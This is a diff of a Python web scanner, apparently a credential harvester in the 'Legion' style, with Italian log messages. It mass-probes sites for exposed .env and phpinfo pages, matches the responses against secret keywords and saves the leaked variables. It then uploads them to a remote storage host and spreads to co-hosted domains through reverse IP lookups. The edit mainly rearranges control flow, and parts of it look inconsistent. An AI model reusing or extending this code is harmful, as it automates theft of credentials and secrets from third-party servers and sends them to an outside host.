@@ -296,123 +296,12 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                 if r: r.close()
             if len(findfile_requests) >= 10:
                 fake_for_site = True
-            if fake_for_site: break
+            if fake_for_site or found_for_site: break
 
 
-        if len(findfile_requests) >= 1:
-            regex_found = False
-            for r in findfile_requests:
-                if r is None: continue
-                try:
-                    contentsx = content_diablo_resp(r)
-                except:
-                    r.close()
-                    continue
-
-
-                response_url = r.url
-                for pattern in keyword_regexenv:
-   
-                    is_regex = any(c in pattern for c in r".^$*+?{}[]\|()")
-                    if is_regex: regex_pattern = pattern
-                    else:
-                        escaped = re.escape(pattern)
-                        start_b = r"\b" if pattern[0].isalnum() or pattern[0] == '_' else ""
-                        end_b = r"\b" if pattern[-1].isalnum() or pattern[-1] == '_' else ""
-                        regex_pattern = f"{start_b}{escaped}{end_b}"
-
-                    for match in re.finditer(regex_pattern, contentsx, re.IGNORECASE):
-                        found_for_site = True
-                        regex_found = True
-                        break
-                    if regex_found: break
-
-                if regex_found:
-
-                    print(f"    [!] 🔥 VULNERABILITA' TROVATA (Regex): {response_url}", flush=True)
-                    rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-
-                    saved_file_path = None
-                    remote_subpath = None
-
-                    try:
-                        html_content = r.text
-                        soup = BeautifulSoup(html_content, "html.parser")
-                        h2_tag = soup.find("h2", string="PHP Variables")
-                        if h2_tag:
-                            table = h2_tag.find_next("table")
-                            if table:
-                                rows = table.find_all("tr")
-                                formatted_output = ""
-                                for row in rows:
-                                    cols = row.find_all("td")
-                                    if len(cols) >= 2:
-                                        var_name = cols[0].get_text(strip=True)
-                                        var_value = cols[1].get_text(strip=True)
-                                        match = re.search(r"\['([^']+)'\]", var_name)
-                                        if match:
-                                            clean_key = match.group(1)
-                                            formatted_output += f"{clean_key} \t {var_value}\n"
-                                if formatted_output:
-                                    print(f"    [!] 🐘 TROVATO PHPINFO: {response_url}", flush=True)
-                                    rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-
-                                    saved_php_path = os.path.join(newpathtextract, f'DIABLO_PHPINFO_{rnd_suffix_php}.txt')
-                                    with open(saved_php_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
-                                    remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix}.txt"
-                                    if saved_file_path and remote_subpath:
-                                        upload_file_to_bunny(saved_php_path, remote_subpath)
-                    except: pass
-
-                    saved_file_path = os.path.join(newpathtextract, f'DIABLO_ENV_NEW_{rnd_suffix}.txt')
-                    with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
-                    remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_ENV_NEW_{rnd_suffix}.txt"
-
-                    if saved_file_path and remote_subpath:
-                        upload_file_to_bunny(saved_file_path, remote_subpath)
-
-                try: r.close()
-                except: pass
-
-                if fake_for_site or found_for_site: break
-
-            if found_for_site and not is_fallback:
-                hostxxx = urlparse(site_link).hostname
-                if not hostxxx:
-                    return
-
-                if hostxxx.startswith("www."):
-                    hostxxx = hostxxx[4:]
-
-                try:
-                    target_ip = socket.gethostbyname(hostxxx)
-                except Exception:
-                    target_ip = None
-
-                if target_ip:
-                    cazzuno = reverse_ip_lookup(target_ip)
-                    if cazzuno:
-                        hostxxx_clean = hostxxx.lower().rstrip('/')
-                        cazzuno = [d for d in cazzuno if d.lower().rstrip('/') != hostxxx_clean]
-                        if cazzuno:
-                            process_urls(cazzuno, is_fallback=True)
-
-        if found_for_site == False:
-            php_batches = site_payloads.get('php', [])
-            for batch in php_batches:
-                reqss = [grequests.post(url, data={"0x01[]":"legion"}, timeout=5, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe) for url in batch]
-                merdb = grequests.map(reqss)
-                for r in merdb:
-                    if r is not None and r.status_code in [200, 206, requests.codes.ok]:
-                        findfiles_requests.append(r)
-                    if r: r.close()
-                if len(findfiles_requests) >= 10:
-                    fake_for_site = True
-                    break
-
-            if len(findfiles_requests) >= 1:
+            if len(findfile_requests) >= 1:
                 regex_found = False
-                for r in findfiles_requests:
+                for r in findfile_requests:
                     if r is None: continue
                     try:
                         contentsx = content_diablo_resp(r)
@@ -446,35 +335,6 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                         saved_file_path = None
                         remote_subpath = None
 
-                        try:
-                            html_content = r.text
-                            soup = BeautifulSoup(html_content, "html.parser")
-                            h2_tag = soup.find("h2", string="PHP Variables")
-                            if h2_tag:
-                                table = h2_tag.find_next("table")
-                                if table:
-                                    rows = table.find_all("tr")
-                                    formatted_output = ""
-                                    for row in rows:
-                                        cols = row.find_all("td")
-                                        if len(cols) >= 2:
-                                            var_name = cols[0].get_text(strip=True)
-                                            var_value = cols[1].get_text(strip=True)
-                                            match = re.search(r"\['([^']+)'\]", var_name)
-                                            if match:
-                                                clean_key = match.group(1)
-                                                formatted_output += f"{clean_key} \t {var_value}\n"
-                                    if formatted_output:
-                                        print(f"    [!] 🐘 TROVATO PHPINFO: {response_url}", flush=True)
-                                        rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-
-                                        saved_php_path = os.path.join(newpathtextract, f'DIABLO_PHPINFO_{rnd_suffix_php}.txt')
-                                        with open(saved_php_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
-                                        remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix}.txt"
-                                        if saved_file_path and remote_subpath:
-                                            upload_file_to_bunny(saved_php_path, remote_subpath)
-                        except: pass
-
                         saved_file_path = os.path.join(newpathtextract, f'DIABLO_ENV_NEW_{rnd_suffix}.txt')
                         with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                         remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_ENV_NEW_{rnd_suffix}.txt"
@@ -487,26 +347,132 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
 
                     if fake_for_site or found_for_site: break
 
-                if found_for_site and not is_fallback:
-                    hostxxx = urlparse(site_link).hostname
-                    if not hostxxx:
-                        return
+        if found_for_site and not is_fallback:
+            hostxxx = urlparse(site_link).hostname
+            if not hostxxx:
+                return
 
-                    if hostxxx.startswith("www."):
-                        hostxxx = hostxxx[4:]
+            if hostxxx.startswith("www."):
+                hostxxx = hostxxx[4:]
 
-                    try:
-                        target_ip = socket.gethostbyname(hostxxx)
-                    except Exception:
-                        target_ip = None
+            try:
+                target_ip = socket.gethostbyname(hostxxx)
+            except Exception:
+                target_ip = None
 
-                    if target_ip:
-                        cazzuno = reverse_ip_lookup(target_ip)
+            if target_ip:
+                cazzuno = reverse_ip_lookup(target_ip)
+                if cazzuno:
+                    hostxxx_clean = hostxxx.lower().rstrip('/')
+                    cazzuno = [d for d in cazzuno if d.lower().rstrip('/') != hostxxx_clean]
+                    if cazzuno:
+                        process_urls(cazzuno, is_fallback=True)
+
+
+        if found_for_site == False:
+            php_batches = site_payloads.get('php', [])
+            for batch in php_batches:
+                reqss = [grequests.post(url, data={"0x01[]":"legion"}, timeout=5, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe) for url in batch]
+                merdb = grequests.map(reqss)
+                for r in merdb:
+                    if r is not None and r.status_code in [200, 206, requests.codes.ok]:
+                        findfiles_requests.append(r)
+                    if r: r.close()
+                if len(findfiles_requests) >= 10:
+                    fake_for_site = True
+                    break
+
+                if len(findfiles_requests) >= 1:
+                    regex_found = False
+                    for r in findfiles_requests:
+                        if r is None: continue
+                        try:
+                            contentsx = content_diablo_resp(r)
+                        except:
+                            r.close()
+                            continue
+
+
+                        response_url = r.url
+                        for pattern in keyword_regexenv:
+        
+                            is_regex = any(c in pattern for c in r".^$*+?{}[]\|()")
+                            if is_regex: regex_pattern = pattern
+                            else:
+                                escaped = re.escape(pattern)
+                                start_b = r"\b" if pattern[0].isalnum() or pattern[0] == '_' else ""
+                                end_b = r"\b" if pattern[-1].isalnum() or pattern[-1] == '_' else ""
+                                regex_pattern = f"{start_b}{escaped}{end_b}"
+
+                            for match in re.finditer(regex_pattern, contentsx, re.IGNORECASE):
+                                found_for_site = True
+                                regex_found = True
+                                break
+                            if regex_found: break
+
+                        if regex_found:
+
+                            print(f"    [!] 🔥 VULNERABILITA' TROVATA (Regex): {response_url}", flush=True)
+                            rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+
+                            saved_file_path = None
+                            remote_subpath = None
+
+                            try:
+                                html_content = r.text
+                                soup = BeautifulSoup(html_content, "html.parser")
+                                h2_tag = soup.find("h2", string="PHP Variables")
+                                if h2_tag:
+                                    table = h2_tag.find_next("table")
+                                    if table:
+                                        rows = table.find_all("tr")
+                                        formatted_output = ""
+                                        for row in rows:
+                                            cols = row.find_all("td")
+                                            if len(cols) >= 2:
+                                                var_name = cols[0].get_text(strip=True)
+                                                var_value = cols[1].get_text(strip=True)
+                                                match = re.search(r"\['([^']+)'\]", var_name)
+                                                if match:
+                                                    clean_key = match.group(1)
+                                                    formatted_output += f"{clean_key} \t {var_value}\n"
+                                        if formatted_output:
+                                            print(f"    [!] 🐘 TROVATO PHPINFO: {response_url}", flush=True)
+                                            rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+
+                                            saved_php_path = os.path.join(newpathtextract, f'DIABLO_PHPINFO_{rnd_suffix_php}.txt')
+                                            with open(saved_php_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
+                                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix}.txt"
+                                            if saved_file_path and remote_subpath:
+                                                upload_file_to_bunny(saved_php_path, remote_subpath)
+                            except: pass
+
+
+                        try: r.close()
+                        except: pass
+
+                        if fake_for_site or found_for_site: break
+
+            if found_for_site and not is_fallback:
+                hostxxx = urlparse(site_link).hostname
+                if not hostxxx:
+                    return
+
+                if hostxxx.startswith("www."):
+                    hostxxx = hostxxx[4:]
+
+                try:
+                    target_ip = socket.gethostbyname(hostxxx)
+                except Exception:
+                    target_ip = None
+
+                if target_ip:
+                    cazzuno = reverse_ip_lookup(target_ip)
+                    if cazzuno:
+                        hostxxx_clean = hostxxx.lower().rstrip('/')
+                        cazzuno = [d for d in cazzuno if d.lower().rstrip('/') != hostxxx_clean]
                         if cazzuno:
-                            hostxxx_clean = hostxxx.lower().rstrip('/')
-                            cazzuno = [d for d in cazzuno if d.lower().rstrip('/') != hostxxx_clean]
-                            if cazzuno:
-                                process_urls(cazzuno, is_fallback=True)
+                            process_urls(cazzuno, is_fallback=True)
 
 
 
